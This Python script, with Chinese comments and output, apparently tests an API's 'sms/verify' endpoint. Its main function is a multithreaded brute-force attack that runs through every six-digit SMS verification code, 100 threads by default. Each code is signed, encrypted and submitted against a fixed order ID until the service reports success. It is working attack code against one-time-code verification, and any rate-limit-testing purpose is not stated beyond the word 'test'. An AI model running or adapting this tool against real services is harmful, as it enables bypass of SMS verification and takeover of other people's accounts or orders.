import argparse
import json
import threading
import time
from typing import Any, Dict, Iterable, Optional, Tuple

import requests

from python_api_test_utils import (
    compute_sign,
    decrypt_response,
    encrypt_request,
    load_config,
)


def generate_codes(length: int, start: int = 0, end: Optional[int] = None) -> Iterable[str]:
  """Yield zero-padded codes within [start, end] (inclusive)."""
  max_value = 10 ** length if end is None else min(end + 1, 10 ** length)
  current = max(start, 0)
  while current < max_value:
    yield str(current).zfill(length)
    current += 1


def call_sms_verify(cfg: Dict[str, Any], sms_code: str) -> Tuple[Dict[str, Any], Dict[str, Any]]:
  """Send one sms/verify request and return (payload_with_sign, decrypted_response)."""
  payload = {
      "orderId": "HXZHXYK958784873763766584",
      "smsCode": sms_code,
      "sdTimestamp": int(time.time() * 1000),
  }
  sign = compute_sign(payload, cfg["REQUEST_SALT"])
  payload_with_sign = {**payload, "sign": sign}

  sd_data = encrypt_request(payload)
  url = f'{cfg["API_BASE_URL"]}{cfg["API_PREFIX"]}/sms/verify'
  timeout = cfg["TIMEOUT"]["DEFAULT"] / 1000.0

  resp = requests.post(
      url,
      json={"sdData": sd_data},
      headers=cfg["DEFAULT_HEADERS"],
      timeout=timeout,
  )
  resp.raise_for_status()

  try:
    raw = resp.json()
  except ValueError as exc:
    raise RuntimeError(f"响应无法解析为 JSON: {resp.text}") from exc

  decrypted = decrypt_response(raw)
  return payload_with_sign, decrypted


def interpret_success(response: Dict[str, Any]) -> bool:
  """Interpret the API response to determine success."""
  if not isinstance(response, dict):
    return False

  success_val = response.get("success")
  if isinstance(success_val, bool):
    return success_val
  if isinstance(success_val, str):
    if success_val.lower() == "true":
      return True

  data_section = response.get("data")
  if isinstance(data_section, dict):
    return interpret_success(data_section)
  return False


def brute_force_sms(cfg: Dict[str, Any], length: int, start_code: int, end_code: Optional[int], threads: int) -> None:
  """Brute-force sms/verify using multiple threads until success."""
  iterator = generate_codes(length, start_code, end_code)
  iterator_lock = threading.Lock()
  attempts = {"count": 0}
  result = {"found": False, "code": None, "payload": None, "response": None}
  stop_event = threading.Event()
  start_time = time.time()

  def worker(worker_id: int) -> None:
    nonlocal iterator
    while not stop_event.is_set():
      with iterator_lock:
        try:
          code = next(iterator)
        except StopIteration:
          stop_event.set()
          return
        attempts["count"] += 1
        attempt_number = attempts["count"]

      try:
        payload, decrypted = call_sms_verify(cfg, code)
      except Exception as exc:  # noqa: BLE001
        print(f"⚠️ 线程{worker_id}验证码 {code} 请求失败: {exc}")
        continue

      is_success = interpret_success(decrypted)
      # 每次都打印当前尝试的验证码及结果，避免与成功混淆
      print(f"尝试 {attempt_number} 次, 验证码 {code} → {'成功' if is_success else '失败'}")

      if is_success:
        stop_event.set()
        result.update(
            {"found": True, "code": code, "payload": payload, "response": decrypted, "attempts": attempt_number}
        )
        return

  threads = max(1, threads)
  workers = []
  for i in range(threads):
    t = threading.Thread(target=worker, args=(i + 1,), daemon=True)
    workers.append(t)
    t.start()

  for t in workers:
    t.join()

  duration = time.time() - start_time
  if result["found"]:
    print("\n🎉 找到成功的验证码!")
    print("验证码:", result["code"])
    print("短信请求数据:", json.dumps(result["payload"], ensure_ascii=False))
    print("解密后的响应:", json.dumps(result["response"], ensure_ascii=False))
    print(f"共尝试 {result['attempts']} 次, 耗时 {duration:.2f} 秒")
  else:
    print(f"🚫 在指定区间内未找到成功验证码，耗时 {duration:.2f} 秒，共尝试 {attempts['count']} 次")


def run_single_code(cfg: Dict[str, Any], code: str) -> None:
  payload, decrypted = call_sms_verify(cfg, code)
  print("📦 请求数据:")
  print(json.dumps(payload, indent=2, ensure_ascii=False))
  print("\n🔓 解密后的响应数据:")
  print(json.dumps(decrypted, indent=2, ensure_ascii=False))
  print("\n✅ success:", interpret_success(decrypted))


def main() -> None:
  parser = argparse.ArgumentParser(description="测试 sms/verify 接口")
  parser.add_argument("--code", help="仅测试指定验证码，而不是暴力模式")
  parser.add_argument("--length", type=int, default=6, help="验证码长度（暴力模式）")
  parser.add_argument("--start", type=int, default=0, help="暴力模式起始数字（包含）")
  parser.add_argument("--end", type=int, help="暴力模式结束数字（包含）")
  parser.add_argument("--threads", type=int, default=100, help="暴力模式的线程数量")
  args = parser.parse_args()

  cfg = load_config()

  if args.code:
    run_single_code(cfg, args.code)
    return

  brute_force_sms(cfg, args.length, args.start, args.end, args.threads)


if __name__ == "__main__":
  main()
